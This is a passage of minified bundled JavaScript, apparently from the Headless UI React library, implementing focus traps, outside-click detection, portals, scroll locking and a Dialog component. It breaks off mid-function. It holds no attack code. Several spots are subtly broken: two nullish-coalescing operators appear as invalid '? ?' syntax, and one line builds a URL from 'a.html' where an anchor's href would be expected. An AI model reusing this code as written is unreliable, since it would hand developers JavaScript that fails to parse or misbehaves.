        m = i[y], m == null || m.focus(u), f += a
    } while (m !== o.activeElement);
    return t & 6 && Rm(m) && m.select(), 2
}

function fl(e, t, n) {
    let r = Be(t);
    v.useEffect(() => {
        function l(o) {
            r.current(o)
        }
        return document.addEventListener(e, l, n), () => document.removeEventListener(e, l, n)
    }, [e, n])
}

function jd(e, t, n) {
    let r = Be(t);
    v.useEffect(() => {
        function l(o) {
            r.current(o)
        }
        return window.addEventListener(e, l, n), () => window.removeEventListener(e, l, n)
    }, [e, n])
}

function Mm(e, t, n = !0) {
    let r = v.useRef(!1);
    v.useEffect(() => {
        requestAnimationFrame(() => {
            r.current = n
        })
    }, [n]);

    function l(i, a) {
        if (!r.current || i.defaultPrevented) return;
        let s = a(i);
        if (s === null || !s.getRootNode().contains(s) || !s.isConnected) return;
        let u = function f(h) {
            return typeof h == "function" ? f(h()) : Array.isArray(h) || h instanceof Set ? h : [h]
        }(e);
        for (let f of u) {
            if (f === null) continue;
            let h = f instanceof HTMLElement ? f : f.current;
            if (h != null && h.contains(s) || i.composed && i.composedPath().includes(h)) return
        }
        return !Lm(s, Pd.Loose) && s.tabIndex !== -1 && i.preventDefault(), t(i, s)
    }
    let o = v.useRef(null);
    fl("pointerdown", i => {
        var a, s;
        r.current && (o.current = ((s = (a = i.composedPath) == null ? void 0 : a.call(i)) == null ? void 0 : s[0]) || i.target)
    }, !0), fl("mousedown", i => {
        var a, s;
        r.current && (o.current = ((s = (a = i.composedPath) == null ? void 0 : a.call(i)) == null ? void 0 : s[0]) || i.target)
    }, !0), fl("click", i => {
        o.current && (l(i, () => o.current), o.current = null)
    }, !0), fl("touchend", i => l(i, () => i.target instanceof HTMLElement ? i.target : null), !0), jd("blur", i => l(i, () => window.document.activeElement instanceof HTMLIFrameElement ? window.document.activeElement : null), !0)
}

function uu(e) {
    var t;
    if (e.type) return e.type;
    let n = (t = e.as) != null ? t : "button";
    if (typeof n == "string" && n.toLowerCase() === "button") return "button"
}

function zm(e, t) {
    let [n, r] = v.useState(() => uu(e));
    return le(() => {
        r(uu(e))
    }, [e.type, e.as]), le(() => {
        n || t.current && t.current instanceof HTMLButtonElement && !t.current.hasAttribute("type") && r("button")
    }, [n, t]), n
}
let _d = Symbol();

function Dm(e, t = !0) {
    return Object.assign(e, {
        [_d]: t
    })
}

function ge(...e) {
    let t = v.useRef(e);
    v.useEffect(() => {
        t.current = e
    }, [e]);
    let n = z(r => {
        for (let l of t.current) l != null && (typeof l == "function" ? l(r) : l.current = r)
    });
    return e.every(r => r == null || (r == null ? void 0 : r[_d])) ? void 0 : n
}

function Zl(...e) {
    return Array.from(new Set(e.flatMap(t => typeof t == "string" ? t.split(" ") : []))).filter(Boolean).join(" ")
}
var Un = (e => (e[e.None = 0] = "None", e[e.RenderStrategy = 1] = "RenderStrategy", e[e.Static = 2] = "Static", e))(Un || {}),
    Lt = (e => (e[e.Unmount = 0] = "Unmount", e[e.Hidden = 1] = "Hidden", e))(Lt || {});

function de({
    ourProps: e,
    theirProps: t,
    slot: n,
    defaultTag: r,
    features: l,
    visible: o = !0,
    name: i
}) {
    let a = $d(t, e);
    if (o) return pl(a, n, r, i);
    let s = l ? ? 0;
    if (s & 2) {
        let {
            static: u = !1,
            ...f
        } = a;
        if (u) return pl(f, n, r, i)
    }
    if (s & 1) {
        let {
            unmount: u = !0,
            ...f
        } = a;
        return Z(u ? 0 : 1, {
            0() {
                return null
            },
            1() {
                return pl({ ...f,
                    hidden: !0,
                    style: {
                        display: "none"
                    }
                }, n, r, i)
            }
        })
    }
    return pl(a, n, r, i)
}

function pl(e, t = {}, n, r) {
    let {
        as: l = n,
        children: o,
        refName: i = "ref",
        ...a
    } = Qo(e, ["unmount", "static"]), s = e.ref !== void 0 ? {
        [i]: e.ref
    } : {}, u = typeof o == "function" ? o(t) : o;
    "className" in a && a.className && typeof a.className == "function" && (a.className = a.className(t));
    let f = {};
    if (t) {
        let h = !1,
            m = [];
        for (let [y, w] of Object.entries(t)) typeof w == "boolean" && (h = !0), w === !0 && m.push(y);
        h && (f["data-headlessui-state"] = m.join(" "))
    }
    if (l === v.Fragment && Object.keys(cu(a)).length > 0) {
        if (!v.isValidElement(u) || Array.isArray(u) && u.length > 1) throw new Error(['Passing props on "Fragment"!', "", `The current component <${r} /> is rendering a "Fragment".`, "However we need to passthrough the following props:", Object.keys(a).map(w => `  - ${w}`).join(`
`), "", "You can apply a few solutions:", ['Add an `as="..."` prop, to ensure that we render an actual element instead of a "Fragment".', "Render a single element as the child so that we can forward the props onto that element."].map(w => `  - ${w}`).join(`
`)].join(`
`));
        let h = u.props,
            m = typeof(h == null ? void 0 : h.className) == "function" ? (...w) => Zl(h == null ? void 0 : h.className(...w), a.className) : Zl(h == null ? void 0 : h.className, a.className),
            y = m ? {
                className: m
            } : {};
        return v.cloneElement(u, Object.assign({}, $d(u.props, cu(Qo(a, ["ref"]))), f, s, Im(u.ref, s.ref), y))
    }
    return v.createElement(l, Object.assign({}, Qo(a, ["ref"]), l !== v.Fragment && s, l !== v.Fragment && f), u)
}

function Im(...e) {
    return {
        ref: e.every(t => t == null) ? void 0 : t => {
            for (let n of e) n != null && (typeof n == "function" ? n(t) : n.current = t)
        }
    }
}

function $d(...e) {
    if (e.length === 0) return {};
    if (e.length === 1) return e[0];
    let t = {},
        n = {};
    for (let r of e)
        for (let l in r) l.startsWith("on") && typeof r[l] == "function" ? (n[l] != null || (n[l] = []), n[l].push(r[l])) : t[l] = r[l];
    if (t.disabled || t["aria-disabled"]) return Object.assign(t, Object.fromEntries(Object.keys(n).map(r => [r, void 0])));
    for (let r in n) Object.assign(t, {
        [r](l, ...o) {
            let i = n[r];
            for (let a of i) {
                if ((l instanceof Event || (l == null ? void 0 : l.nativeEvent) instanceof Event) && l.defaultPrevented) return;
                a(l, ...o)
            }
        }
    });
    return t
}

function oe(e) {
    var t;
    return Object.assign(v.forwardRef(e), {
        displayName: (t = e.displayName) != null ? t : e.name
    })
}

function cu(e) {
    let t = Object.assign({}, e);
    for (let n in t) t[n] === void 0 && delete t[n];
    return t
}

function Qo(e, t = []) {
    let n = Object.assign({}, e);
    for (let r of t) r in n && delete n[r];
    return n
}

function Am(e) {
    let t = e.parentElement,
        n = null;
    for (; t && !(t instanceof HTMLFieldSetElement);) t instanceof HTMLLegendElement && (n = t), t = t.parentElement;
    let r = (t == null ? void 0 : t.getAttribute("disabled")) === "";
    return r && Wm(n) ? !1 : r
}

function Wm(e) {
    if (!e) return !1;
    let t = e.previousElementSibling;
    for (; t !== null;) {
        if (t instanceof HTMLLegendElement) return !1;
        t = t.previousElementSibling
    }
    return !0
}
let Um = "div";
var Dr = (e => (e[e.None = 1] = "None", e[e.Focusable = 2] = "Focusable", e[e.Hidden = 4] = "Hidden", e))(Dr || {});

function Bm(e, t) {
    let {
        features: n = 1,
        ...r
    } = e, l = {
        ref: t,
        "aria-hidden": (n & 2) === 2 ? !0 : void 0,
        style: {
            position: "fixed",
            top: 1,
            left: 1,
            width: 1,
            height: 0,
            padding: 0,
            margin: -1,
            overflow: "hidden",
            clip: "rect(0, 0, 0, 0)",
            whiteSpace: "nowrap",
            borderWidth: "0",
            ...(n & 4) === 4 && (n & 2) !== 2 && {
                display: "none"
            }
        }
    };
    return de({
        ourProps: l,
        theirProps: r,
        slot: {},
        defaultTag: Um,
        name: "Hidden"
    })
}
let Ir = oe(Bm),
    Qa = v.createContext(null);
Qa.displayName = "OpenClosedContext";
var $e = (e => (e[e.Open = 1] = "Open", e[e.Closed = 2] = "Closed", e[e.Closing = 4] = "Closing", e[e.Opening = 8] = "Opening", e))($e || {});

function Ka() {
    return v.useContext(Qa)
}

function Hm({
    value: e,
    children: t
}) {
    return F.createElement(Qa.Provider, {
        value: e
    }, t)
}
var De = (e => (e.Space = " ", e.Enter = "Enter", e.Escape = "Escape", e.Backspace = "Backspace", e.Delete = "Delete", e.ArrowLeft = "ArrowLeft", e.ArrowUp = "ArrowUp", e.ArrowRight = "ArrowRight", e.ArrowDown = "ArrowDown", e.Home = "Home", e.End = "End", e.PageUp = "PageUp", e.PageDown = "PageDown", e.Tab = "Tab", e))(De || {});

function Ya(e, t) {
    let n = v.useRef([]),
        r = z(e);
    v.useEffect(() => {
        let l = [...n.current];
        for (let [o, i] of t.entries())
            if (n.current[o] !== i) {
                let a = r(t, l);
                return n.current = t, a
            }
    }, [r, ...t])
}

function Vm() {
    return /iPhone/gi.test(window.navigator.platform) || /Mac/gi.test(window.navigator.platform) && window.navigator.maxTouchPoints > 0
}

function Qr(...e) {
    return v.useMemo(() => Va(...e), [...e])
}
var cr = (e => (e[e.Forwards = 0] = "Forwards", e[e.Backwards = 1] = "Backwards", e))(cr || {});

function Qm() {
    let e = v.useRef(0);
    return jd("keydown", t => {
        t.key === "Tab" && (e.current = t.shiftKey ? 1 : 0)
    }, !0), e
}

function Yn() {
    let e = v.useRef(!1);
    return le(() => (e.current = !0, () => {
        e.current = !1
    }), []), e
}

function Ld(e, t, n, r) {
    let l = Be(n);
    v.useEffect(() => {
        e = e ? ? window;

        function o(i) {
            l.current(i)
        }
        return e.addEventListener(t, o, r), () => e.removeEventListener(t, o, r)
    }, [e, t, r])
}

function Km(e) {
    function t() {
        document.readyState !== "loading" && (e(), document.removeEventListener("DOMContentLoaded", t))
    }
    typeof window < "u" && typeof document < "u" && (document.addEventListener("DOMContentLoaded", t), t())
}

function Fd(e) {
    let t = z(e),
        n = v.useRef(!1);
    v.useEffect(() => (n.current = !1, () => {
        n.current = !0, Vr(() => {
            n.current && t()
        })
    }), [t])
}

function Od(e) {
    if (!e) return new Set;
    if (typeof e == "function") return new Set(e());
    let t = new Set;
    for (let n of e.current) n.current instanceof HTMLElement && t.add(n.current);
    return t
}
let Ym = "div";
var Rd = (e => (e[e.None = 1] = "None", e[e.InitialFocus = 2] = "InitialFocus", e[e.TabLock = 4] = "TabLock", e[e.FocusLock = 8] = "FocusLock", e[e.RestoreFocus = 16] = "RestoreFocus", e[e.All = 30] = "All", e))(Rd || {});

function Gm(e, t) {
    let n = v.useRef(null),
        r = ge(n, t),
        {
            initialFocus: l,
            containers: o,
            features: i = 30,
            ...a
        } = e;
    Kn() || (i = 1);
    let s = Qr(n);
    Jm({
        ownerDocument: s
    }, !!(i & 16));
    let u = qm({
        ownerDocument: s,
        container: n,
        initialFocus: l
    }, !!(i & 2));
    e0({
        ownerDocument: s,
        container: n,
        containers: o,
        previousActiveElement: u
    }, !!(i & 8));
    let f = Qm(),
        h = z(x => {
            let N = n.current;
            N && (d => d())(() => {
                Z(f.current, {
                    [cr.Forwards]: () => {
                        nt(N, se.First, {
                            skipElements: [x.relatedTarget]
                        })
                    },
                    [cr.Backwards]: () => {
                        nt(N, se.Last, {
                            skipElements: [x.relatedTarget]
                        })
                    }
                })
            })
        }),
        m = Ha(),
        y = v.useRef(!1),
        w = {
            ref: r,
            onKeyDown(x) {
                x.key == "Tab" && (y.current = !0, m.requestAnimationFrame(() => {
                    y.current = !1
                }))
            },
            onBlur(x) {
                let N = Od(o);
                n.current instanceof HTMLElement && N.add(n.current);
                let d = x.relatedTarget;
                d instanceof HTMLElement && d.dataset.headlessuiFocusGuard !== "true" && (Md(N, d) || (y.current ? nt(n.current, Z(f.current, {
                    [cr.Forwards]: () => se.Next,
                    [cr.Backwards]: () => se.Previous
                }) | se.WrapAround, {
                    relativeTo: x.target
                }) : x.target instanceof HTMLElement && rn(x.target)))
            }
        };
    return F.createElement(F.Fragment, null, !!(i & 4) && F.createElement(Ir, {
        as: "button",
        type: "button",
        "data-headlessui-focus-guard": !0,
        onFocus: h,
        features: Dr.Focusable
    }), de({
        ourProps: w,
        theirProps: a,
        defaultTag: Ym,
        name: "FocusTrap"
    }), !!(i & 4) && F.createElement(Ir, {
        as: "button",
        type: "button",
        "data-headlessui-focus-guard": !0,
        onFocus: h,
        features: Dr.Focusable
    }))
}
let Xm = oe(Gm),
    lr = Object.assign(Xm, {
        features: Rd
    }),
    jt = [];
Km(() => {
    function e(t) {
        t.target instanceof HTMLElement && t.target !== document.body && jt[0] !== t.target && (jt.unshift(t.target), jt = jt.filter(n => n != null && n.isConnected), jt.splice(10))
    }
    window.addEventListener("click", e, {
        capture: !0
    }), window.addEventListener("mousedown", e, {
        capture: !0
    }), window.addEventListener("focus", e, {
        capture: !0
    }), document.body.addEventListener("click", e, {
        capture: !0
    }), document.body.addEventListener("mousedown", e, {
        capture: !0
    }), document.body.addEventListener("focus", e, {
        capture: !0
    })
});

function Zm(e = !0) {
    let t = v.useRef(jt.slice());
    return Ya(([n], [r]) => {
        r === !0 && n === !1 && Vr(() => {
            t.current.splice(0)
        }), r === !1 && n === !0 && (t.current = jt.slice())
    }, [e, jt, t]), z(() => {
        var n;
        return (n = t.current.find(r => r != null && r.isConnected)) != null ? n : null
    })
}

function Jm({
    ownerDocument: e
}, t) {
    let n = Zm(t);
    Ya(() => {
        t || (e == null ? void 0 : e.activeElement) === (e == null ? void 0 : e.body) && rn(n())
    }, [t]), Fd(() => {
        t && rn(n())
    })
}

function qm({
    ownerDocument: e,
    container: t,
    initialFocus: n
}, r) {
    let l = v.useRef(null),
        o = Yn();
    return Ya(() => {
        if (!r) return;
        let i = t.current;
        i && Vr(() => {
            if (!o.current) return;
            let a = e == null ? void 0 : e.activeElement;
            if (n != null && n.current) {
                if ((n == null ? void 0 : n.current) === a) {
                    l.current = a;
                    return
                }
            } else if (i.contains(a)) {
                l.current = a;
                return
            }
            n != null && n.current ? rn(n.current) : nt(i, se.First) === Tn.Error && console.warn("There are no focusable elements inside the <FocusTrap />"), l.current = e == null ? void 0 : e.activeElement
        })
    }, [r]), l
}

function e0({
    ownerDocument: e,
    container: t,
    containers: n,
    previousActiveElement: r
}, l) {
    let o = Yn();
    Ld(e == null ? void 0 : e.defaultView, "focus", i => {
        if (!l || !o.current) return;
        let a = Od(n);
        t.current instanceof HTMLElement && a.add(t.current);
        let s = r.current;
        if (!s) return;
        let u = i.target;
        u && u instanceof HTMLElement ? Md(a, u) ? (r.current = u, rn(u)) : (i.preventDefault(), i.stopPropagation(), rn(s)) : rn(r.current)
    }, !0)
}

function Md(e, t) {
    for (let n of e)
        if (n.contains(t)) return !0;
    return !1
}
let zd = v.createContext(!1);

function t0() {
    return v.useContext(zd)
}

function Vi(e) {
    return F.createElement(zd.Provider, {
        value: e.force
    }, e.children)
}

function n0(e) {
    let t = t0(),
        n = v.useContext(Dd),
        r = Qr(e),
        [l, o] = v.useState(() => {
            if (!t && n !== null || ht.isServer) return null;
            let i = r == null ? void 0 : r.getElementById("headlessui-portal-root");
            if (i) return i;
            if (r === null) return null;
            let a = r.createElement("div");
            return a.setAttribute("id", "headlessui-portal-root"), r.body.appendChild(a)
        });
    return v.useEffect(() => {
        l !== null && (r != null && r.body.contains(l) || r == null || r.body.appendChild(l))
    }, [l, r]), v.useEffect(() => {
        t || n !== null && o(n.current)
    }, [n, o, t]), l
}
let r0 = v.Fragment;

function l0(e, t) {
    let n = e,
        r = v.useRef(null),
        l = ge(Dm(f => {
            r.current = f
        }), t),
        o = Qr(r),
        i = n0(r),
        [a] = v.useState(() => {
            var f;
            return ht.isServer ? null : (f = o == null ? void 0 : o.createElement("div")) != null ? f : null
        }),
        s = v.useContext(Qi),
        u = Kn();
    return le(() => {
        !i || !a || i.contains(a) || (a.setAttribute("data-headlessui-portal", ""), i.appendChild(a))
    }, [i, a]), le(() => {
        if (a && s) return s.register(a)
    }, [s, a]), Fd(() => {
        var f;
        !i || !a || (a instanceof Node && i.contains(a) && i.removeChild(a), i.childNodes.length <= 0 && ((f = i.parentElement) == null || f.removeChild(i)))
    }), u ? !i || !a ? null : Cd.createPortal(de({
        ourProps: {
            ref: l
        },
        theirProps: n,
        defaultTag: r0,
        name: "Portal"
    }), a) : null
}
let o0 = v.Fragment,
    Dd = v.createContext(null);

function i0(e, t) {
    let {
        target: n,
        ...r
    } = e, l = {
        ref: ge(t)
    };
    return F.createElement(Dd.Provider, {
        value: n
    }, de({
        ourProps: l,
        theirProps: r,
        defaultTag: o0,
        name: "Popover.Group"
    }))
}
let Qi = v.createContext(null);

function a0() {
    let e = v.useContext(Qi),
        t = v.useRef([]),
        n = z(o => (t.current.push(o), e && e.register(o), () => r(o))),
        r = z(o => {
            let i = t.current.indexOf(o);
            i !== -1 && t.current.splice(i, 1), e && e.unregister(o)
        }),
        l = v.useMemo(() => ({
            register: n,
            unregister: r,
            portals: t
        }), [n, r, t]);
    return [t, v.useMemo(() => function({
        children: o
    }) {
        return F.createElement(Qi.Provider, {
            value: l
        }, o)
    }, [l])]
}
let s0 = oe(l0),
    u0 = oe(i0),
    Ki = Object.assign(s0, {
        Group: u0
    }),
    Id = v.createContext(null);

function Ad() {
    let e = v.useContext(Id);
    if (e === null) {
        let t = new Error("You used a <Description /> component, but it is not inside a relevant parent.");
        throw Error.captureStackTrace && Error.captureStackTrace(t, Ad), t
    }
    return e
}

function c0() {
    let [e, t] = v.useState([]);
    return [e.length > 0 ? e.join(" ") : void 0, v.useMemo(() => function(n) {
        let r = z(o => (t(i => [...i, o]), () => t(i => {
                let a = i.slice(),
                    s = a.indexOf(o);
                return s !== -1 && a.splice(s, 1), a
            }))),
            l = v.useMemo(() => ({
                register: r,
                slot: n.slot,
                name: n.name,
                props: n.props
            }), [r, n.slot, n.name, n.props]);
        return F.createElement(Id.Provider, {
            value: l
        }, n.children)
    }, [t])]
}
let d0 = "p";

function f0(e, t) {
    let n = Qt(),
        {
            id: r = `headlessui-description-${n}`,
            ...l
        } = e,
        o = Ad(),
        i = ge(t);
    le(() => o.register(r), [r, o.register]);
    let a = {
        ref: i,
        ...o.props,
        id: r
    };
    return de({
        ourProps: a,
        theirProps: l,
        slot: o.slot || {},
        defaultTag: d0,
        name: o.name || "Description"
    })
}
let p0 = oe(f0),
    m0 = Object.assign(p0, {}),
    Ga = v.createContext(() => {});
Ga.displayName = "StackContext";
var Yi = (e => (e[e.Add = 0] = "Add", e[e.Remove = 1] = "Remove", e))(Yi || {});

function h0() {
    return v.useContext(Ga)
}

function v0({
    children: e,
    onUpdate: t,
    type: n,
    element: r,
    enabled: l
}) {
    let o = h0(),
        i = z((...a) => {
            t == null || t(...a), o(...a)
        });
    return le(() => {
        let a = l === void 0 || l === !0;
        return a && i(0, n, r), () => {
            a && i(1, n, r)
        }
    }, [i, n, r, l]), F.createElement(Ga.Provider, {
        value: i
    }, e)
}

function g0(e, t) {
    return e === t && (e !== 0 || 1 / e === 1 / t) || e !== e && t !== t
}
const y0 = typeof Object.is == "function" ? Object.is : g0,
    {
        useState: w0,
        useEffect: x0,
        useLayoutEffect: k0,
        useDebugValue: S0
    } = xr;

function b0(e, t, n) {
    const r = t(),
        [{
            inst: l
        }, o] = w0({
            inst: {
                value: r,
                getSnapshot: t
            }
        });
    return k0(() => {
        l.value = r, l.getSnapshot = t, Ko(l) && o({
            inst: l
        })
    }, [e, r, t]), x0(() => (Ko(l) && o({
        inst: l
    }), e(() => {
        Ko(l) && o({
            inst: l
        })
    })), [e]), S0(r), r
}

function Ko(e) {
    const t = e.getSnapshot,
        n = e.value;
    try {
        const r = t();
        return !y0(n, r)
    } catch {
        return !0
    }
}

function E0(e, t, n) {
    return t()
}
const N0 = typeof window < "u" && typeof window.document < "u" && typeof window.document.createElement < "u",
    C0 = !N0,
    T0 = C0 ? E0 : b0,
    P0 = "useSyncExternalStore" in xr ? (e => e.useSyncExternalStore)(xr) : T0;

function j0(e) {
    return P0(e.subscribe, e.getSnapshot, e.getSnapshot)
}

function _0(e, t) {
    let n = e(),
        r = new Set;
    return {
        getSnapshot() {
            return n
        },
        subscribe(l) {
            return r.add(l), () => r.delete(l)
        },
        dispatch(l, ...o) {
            let i = t[l].call(n, ...o);
            i && (n = i, r.forEach(a => a()))
        }
    }
}

function $0() {
    let e;
    return {
        before({
            doc: t
        }) {
            var n;
            let r = t.documentElement;
            e = ((n = t.defaultView) != null ? n : window).innerWidth - r.clientWidth
        },
        after({
            doc: t,
            d: n
        }) {
            let r = t.documentElement,
                l = r.clientWidth - r.offsetWidth,
                o = e - l;
            n.style(r, "paddingRight", `${o}px`)
        }
    }
}

function L0() {
    if (!Vm()) return {};
    let e;
    return {
        before() {
            e = window.pageYOffset
        },
        after({
            doc: t,
            d: n,
            meta: r
        }) {
            function l(o) {
                return r.containers.flatMap(i => i()).some(i => i.contains(o))
            }
            n.microTask(() => {
                if (window.getComputedStyle(t.documentElement).scrollBehavior !== "auto") {
                    let i = fn();
                    i.style(t.documentElement, "scroll-behavior", "auto"), n.add(() => n.microTask(() => i.dispose()))
                }
                n.style(t.body, "marginTop", `-${e}px`), window.scrollTo(0, 0);
                let o = null;
                n.addEventListener(t, "click", i => {
                    if (i.target instanceof HTMLElement) try {
                        let a = i.target.closest("a");
                        if (!a) return;
                        let {
                            hash: s
                        } = new URL(a.html), u = t.querySelector(s);
                        u && !l(u) && (o = u)
                    } catch {}
                }, !0), n.addEventListener(t, "touchmove", i => {
                    i.target instanceof HTMLElement && !l(i.target) && i.preventDefault()
                }, {
                    passive: !1
                }), n.add(() => {
                    window.scrollTo(0, window.pageYOffset + e), o && o.isConnected && (o.scrollIntoView({
                        block: "nearest"
                    }), o = null)
                })
            })
        }
    }
}

function F0() {
    return {
        before({
            doc: e,
            d: t
        }) {
            t.style(e.documentElement, "overflow", "hidden")
        }
    }
}

function O0(e) {
    let t = {};
    for (let n of e) Object.assign(t, n(t));
    return t
}
let en = _0(() => new Map, {
    PUSH(e, t) {
        var n;
        let r = (n = this.get(e)) != null ? n : {
            doc: e,
            count: 0,
            d: fn(),
            meta: new Set
        };
        return r.count++, r.meta.add(t), this.set(e, r), this
    },
    POP(e, t) {
        let n = this.get(e);
        return n && (n.count--, n.meta.delete(t)), this
    },
    SCROLL_PREVENT({
        doc: e,
        d: t,
        meta: n
    }) {
        let r = {
                doc: e,
                d: t,
                meta: O0(n)
            },
            l = [L0(), $0(), F0()];
        l.forEach(({
            before: o
        }) => o == null ? void 0 : o(r)), l.forEach(({
            after: o
        }) => o == null ? void 0 : o(r))
    },
    SCROLL_ALLOW({
        d: e
    }) {
        e.dispose()
    },
    TEARDOWN({
        doc: e
    }) {
        this.delete(e)
    }
});
en.subscribe(() => {
    let e = en.getSnapshot(),
        t = new Map;
    for (let [n] of e) t.set(n, n.documentElement.style.overflow);
    for (let n of e.values()) {
        let r = t.get(n.doc) === "hidden",
            l = n.count !== 0;
        (l && !r || !l && r) && en.dispatch(n.count > 0 ? "SCROLL_PREVENT" : "SCROLL_ALLOW", n), n.count === 0 && en.dispatch("TEARDOWN", n)
    }
});

function R0(e, t, n) {
    let r = j0(en),
        l = e ? r.get(e) : void 0,
        o = l ? l.count > 0 : !1;
    return le(() => {
        if (!(!e || !t)) return en.dispatch("PUSH", e, n), () => en.dispatch("POP", e, n)
    }, [t, e]), o
}
let Yo = new Map,
    or = new Map;

function du(e, t = !0) {
    le(() => {
        var n;
        if (!t) return;
        let r = typeof e == "function" ? e() : e.current;
        if (!r) return;

        function l() {
            var i;
            if (!r) return;
            let a = (i = or.get(r)) != null ? i : 1;
            if (a === 1 ? or.delete(r) : or.set(r, a - 1), a !== 1) return;
            let s = Yo.get(r);
            s && (s["aria-hidden"] === null ? r.removeAttribute("aria-hidden") : r.setAttribute("aria-hidden", s["aria-hidden"]), r.inert = s.inert, Yo.delete(r))
        }
        let o = (n = or.get(r)) != null ? n : 0;
        return or.set(r, o + 1), o !== 0 || (Yo.set(r, {
            "aria-hidden": r.getAttribute("aria-hidden"),
            inert: r.inert
        }), r.setAttribute("aria-hidden", "true"), r.inert = !0), l
    }, [e, t])
}

function M0({
    defaultContainers: e = [],
    portals: t,
    mainTreeNodeRef: n
} = {}) {
    var r;
    let l = v.useRef((r = n == null ? void 0 : n.current) != null ? r : null),
        o = Qr(l),
        i = z(() => {
            var a;
            let s = [];
            for (let u of e) u !== null && (u instanceof HTMLElement ? s.push(u) : "current" in u && u.current instanceof HTMLElement && s.push(u.current));
            if (t != null && t.current)
                for (let u of t.current) s.push(u);
            for (let u of (a = o == null ? void 0 : o.querySelectorAll("html > *, body > *")) != null ? a : []) u !== document.body && u !== document.head && u instanceof HTMLElement && u.id !== "headlessui-portal-root" && (u.contains(l.current) || s.some(f => u.contains(f)) || s.push(u));
            return s
        });
    return {
        resolveContainers: i,
        contains: z(a => i().some(s => s.contains(a))),
        mainTreeNodeRef: l,
        MainTreeNode: v.useMemo(() => function() {
            return n != null ? null : F.createElement(Ir, {
                features: Dr.Hidden,
                ref: l
            })
        }, [l, n])
    }
}
var z0 = (e => (e[e.Open = 0] = "Open", e[e.Closed = 1] = "Closed", e))(z0 || {}),
    D0 = (e => (e[e.SetTitleId = 0] = "SetTitleId", e))(D0 || {});
let I0 = {
        0(e, t) {
            return e.titleId === t.id ? e : { ...e,
                titleId: t.id
            }
        }
    },
    Jl = v.createContext(null);
Jl.displayName = "DialogContext";

function Kr(e) {
    let t = v.useContext(Jl);
    if (t === null) {
        let n = new Error(`<${e} /> is missing a parent <Dialog /> component.`);
        throw Error.captureStackTrace && Error.captureStackTrace(n, Kr), n
    }
    return t
}

function A0(e, t, n = () => [document.body]) {
    R0(e, t, r => {
        var l;
        return {
            containers: [...(l = r.containers) != null ? l : [], n]
        }
    })
}

function W0(e, t) {
    return Z(t.type, I0, e, t)
}
let U0 = "div",
    B0 = Un.RenderStrategy | Un.Static;

function H0(e, t) {
    var n;
    let r = Qt(),
        {
            id: l = `headlessui-dialog-${r}`,
            open: o,
            onClose: i,
            initialFocus: a,
            __demoMode: s = !1,
            ...u
        } = e,
        [f, h] = v.useState(0),
        m = Ka();
    o === void 0 && m !== null && (o = (m & $e.Open) === $e.Open);
    let y = v.useRef(null),
        w = ge(y, t),
        x = Qr(y),
        N = e.hasOwnProperty("open") || m !== null,
        d = e.hasOwnProperty("onClose");
    if (!N && !d) throw new Error("You have to provide an `open` and an `onClose` prop to the `Dialog` component.");
    if (!N) throw new Error("You provided an `onClose` prop to the `Dialog`, but forgot an `open` prop.");
    if (!d) throw new Error("You provided an `open` prop to the `Dialog`, but forgot an `onClose` prop.");
    if (typeof o != "boolean") throw new Error(`You provided an \`open\` prop to the \`Dialog\`, but the value is not a boolean. Received: ${o}`);
    if (typeof i != "function") throw new Error(`You provided an \`onClose\` prop to the \`Dialog\`, but the value is not a function. Received: ${i}`);
    let c = o ? 0 : 1,
        [p, k] = v.useReducer(W0, {
            titleId: null,
            descriptionId: null,
            panelRef: v.createRef()
        }),
        b = z(() => i(!1)),
        C = z(ie => k({
            type: 0,
            id: ie
        })),
        T = Kn() ? s ? !1 : c === 0 : !1,
        E = f > 1,
        O = v.useContext(Jl) !== null,
        [P, A] = a0(),
        {
            resolveContainers: q,
            mainTreeNodeRef: fe,
            MainTreeNode: it
        } = M0({
            portals: P,
            defaultContainers: [(n = p.panelRef.current) != null ? n : y.current]
        }),
        kt = E ? "parent" : "leaf",
        St = m !== null ? (m & $e.Closing) === $e.Closing : !1,
        Qe = (() => O || St ? !1 : T)(),
        j = v.useCallback(() => {
            var ie, ut;
            return (ut = Array.from((ie = x == null ? void 0 : x.querySelectorAll("body > *")) != null ? ie : []).find(ze => ze.id === "headlessui-portal-root" ? !1 : ze.contains(fe.current) && ze instanceof HTMLElement)) != null ? ut : null
        }, [fe]);
    du(j, Qe);
    let $ = (() => E ? !0 : T)(),
        L = v.useCallback(() => {
            var ie, ut;
            return (ut = Array.from((ie = x == null ? void 0 : x.querySelectorAll("[data-headlessui-portal]")) != null ? ie : []).find(ze => ze.contains(fe.current) && ze instanceof HTMLElement)) != null ? ut : null
        }, [fe]);
    du(L, $);
    let D = (() => !(!T || E))();
    Mm(q, b, D);
    let Y = (() => !(E || c !== 0))();
    Ld(x == null ? void 0 : x.defaultView, "keydown", ie => {
        Y && (ie.defaultPrevented || ie.key === De.Escape && (ie.preventDefault(), ie.stopPropagation(), b()))
    });
    let ye = (() => !(St || c !== 0 || O))();
    A0(x, ye, q), v.useEffect(() => {
        if (c !== 0 || !y.current) return;
        let ie = new ResizeObserver(ut => {
            for (let ze of ut) {
                let Yr = ze.target.getBoundingClientRect();
                Yr.x === 0 && Yr.y === 0 && Yr.width === 0 && Yr.height === 0 && b()
            }
        });
        return ie.observe(y.current), () => ie.disconnect()
    }, [c, y, b]);
    let [at, Gn] = c0(), st = v.useMemo(() => [{
        dialogState: c,
        close: b,
        setTitleId: C
    }, p], [c, p, b, C]), Kt = v.useMemo(() => ({
        open: c === 0
    }), [c]), Qd = {
        ref: w,
        id: l,
        role: "dialog",
        "aria-modal": c === 0 ? !0 : void 0,
        "aria-labelledby": p.titleId,
        "aria-describedby": at
    };
    return F.createElement(v0, {
        type: "Dialog",
        enabled: c === 0,
        element: y,
        onUpdate: z((ie, ut) => {
            ut === "Dialog" && Z(ie, {
                [Yi.Add]: () => h(ze => ze + 1),
                [Yi.Remove]: () => h(ze => ze - 1)
            })
        })
    }, F.createElement(Vi, {
        force: !0
    }, F.createElement(Ki, null, F.createElement(Jl.Provider, {
        value: st
    }, F.createElement(Ki.Group, {
        target: y
    }, F.createElement(Vi, {
        force: !1
    }, F.createElement(Gn, {
        slot: Kt,
        name: "Dialog.Description"
    }, F.createElement(lr, {
        initialFocus: a,
        containers: q,
        features: T ? Z(kt, {
            parent: lr.features.RestoreFocus,
            leaf: lr.features.All & ~lr.features.FocusLock
        }) : lr.features.None
    }, F.createElement(A, null, de({
        ourProps: Qd,
        theirProps: u,
        slot: Kt,
        defaultTag: U0,
        features: B0,
        visible: c === 0,
        name: "Dialog"
    }))))))))), F.createElement(it, null))
}
let V0 = "div";

function Q0(e, t) {
    let n = Qt(),
        {
